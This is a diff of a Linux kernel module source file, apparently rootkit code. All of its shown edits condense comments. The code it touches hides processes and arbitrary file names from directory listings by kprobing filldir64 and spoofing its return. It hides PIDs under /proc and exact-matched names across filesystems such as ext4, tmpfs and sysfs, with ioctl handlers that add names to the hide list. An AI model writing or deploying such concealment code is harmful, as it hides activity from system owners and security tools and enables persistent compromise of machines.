@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-only
-// Hide /proc/<pid> entries by kprobing filldir64 and spoofing its return.
-// filldir64 signature stayed (ctx, name, namlen, offset, ino, d_type) across 5.10..6.12; only the return type flipped int->bool at 6.5, harmless because we always spoof zero which is false/0.
+// Hide dirents (PIDs + arbitrary names) by kprobing filldir64 and spoofing its return.
+// Signature stable 5.10..6.12; return flipped int→bool at 6.5, harmless — we always return 0/false.
 
 #include <linux/errno.h>
 #include <linux/fs.h>
@@ -22,14 +22,10 @@
 
 #define HT_NAME_BUF 12
 
-/* Forward decl: definition lives further down (kprobe struct + register path
- * are declared after the name-hide helpers). Both name_add and pid_add funnel
- * through this lazy-arm gate. */
+/* Forward decl — definition further down; both name_add and pid_add funnel through this lazy-arm gate. */
 static int hide_task_register_kprobe_locked(void);
 
-/* File-name hiding (B.1). Each slot holds up to HIDE_NAME_MAX-1 chars and
- * matches on exact directory-entry name equality — cheap to test in the
- * filldir64 pre-handler. Applies to every readdir path in the kernel. */
+/* B.1 file-name hiding: exact basename match, up to HIDE_NAME_MAX-1 chars per slot. */
 #define HIDE_NAME_MAX 64u
 #define HIDE_NAME_SLOTS 16u
 struct hidden_name_entry {
@@ -46,8 +42,7 @@ static DEFINE_MUTEX(kp_lock);
 static struct kprobe filldir_kp;
 static bool kp_registered;
 
-/* Fast substring/eq check against hidden_names. Used from the filldir64
- * pre-handler with IRQs disabled — must not sleep and must stay short. */
+/* Called from the filldir64 pre-handler (IRQs disabled) — must be short and non-sleeping. */
 static bool hidden_name_matches(const char *name, int namlen) {
 	unsigned long flags;
 	unsigned int i;
@@ -80,8 +75,7 @@ int hide_task_name_add(const char *name) {
 	len = strnlen(name, HIDE_NAME_MAX);
 	if (len == 0 || len >= HIDE_NAME_MAX) return -EINVAL;
 
-	/* Same lazy arm as hide_task_add — the filldir64 kprobe services BOTH
-	 * PID and name hide, and either add-path may be the first caller. */
+	/* Shared lazy arm — the single kprobe services PID and name hides. */
 	mutex_lock(&kp_lock);
 	rc = hide_task_register_kprobe_locked();
 	mutex_unlock(&kp_lock);
@@ -174,11 +168,7 @@ bool hide_task_contains(pid_t pid) {
 	return hit;
 }
 
-/* filldir64(ctx, name, namlen, offset, ino, d_type) — x0..x5 on arm64.
- * Two hide gates share the same probe:
- *   1. DT_DIR + numeric name matching hidden_pids[] — /proc/<pid> hiding
- *   2. any dirent (file OR dir) whose exact name is in hidden_names[] — B.1
- *      file hiding; single hook covers ext4/f2fs/tmpfs/overlayfs/proc/sysfs. */
+/* filldir64(ctx, name, namlen, offset, ino, d_type) → x0..x5. Two gates: DT_DIR+numeric = PID hide; any dirent name in hidden_names[] = B.1. */
 static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	const char *name;
 	int namlen;
@@ -307,9 +297,7 @@ int hide_task_list(pid_t *out, size_t max) {
 	return n;
 }
 
-/* Called from the file-name ioctls — copy up to HIDE_NAME_MAX-1 bytes from
- * @arg.buf (already validated below) into a stack buffer, NUL-terminate, then
- * dispatch to the requested op. */
+/* Copy up to HIDE_NAME_MAX-1 bytes from userspace, NUL-terminate, dispatch to @op. */
 static long copy_and_hide_name(void __user *ubuf, u64 blen, int (*op)(const char *)) {
 	char name[HIDE_NAME_MAX];
 	if (!ubuf || blen == 0 || blen >= HIDE_NAME_MAX)
